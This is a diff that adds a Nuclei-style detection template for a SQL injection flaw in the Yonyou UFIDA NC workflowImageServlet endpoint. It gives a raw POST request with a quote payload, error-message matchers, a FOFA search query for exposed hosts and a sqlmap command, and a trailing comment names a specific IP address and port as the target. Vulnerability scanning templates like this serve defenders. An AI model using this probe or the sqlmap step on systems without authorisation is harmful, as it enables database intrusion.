@@ -1,0 +1,44 @@
+id: yonyou-nc-workflowImageServlet-sqli
+
+info:
+  name: 用友 UFIDA NC workflowImageServlet/doPost - sqli
+  author: leadlife
+  severity: high
+  description: Detects SQL Injection vulnerability in Yonyou NC workflowImageServlet.
+  reference:
+    - https://github.com/wy876/POC/commit/ee9d02fb7cece93cb920b0d4654468cc08acedd4
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+    sqlmap: sqlmap -r sqli.txt 
+  tags: yonyou,sqli,nc,oa
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/servlet/workflowImageServlet/doPost?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        wfpk=1'&proInsPk=t
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      
+      - type: word
+        part: body
+        words:
+          - "引号内的字符串没有正确结束"
+          - "quoted string not properly terminated"
+        condition: or      
+
+# POST /portal/pt/servlet/workflowImageServlet/doPost?pageId=login HTTP/1.1
+# Host: 122.224.27.162:8080
+# Content-Type: application/x-www-form-urlencoded
+# Content-Length: 45
+
+# wfpk=*&proInsPk=*
+
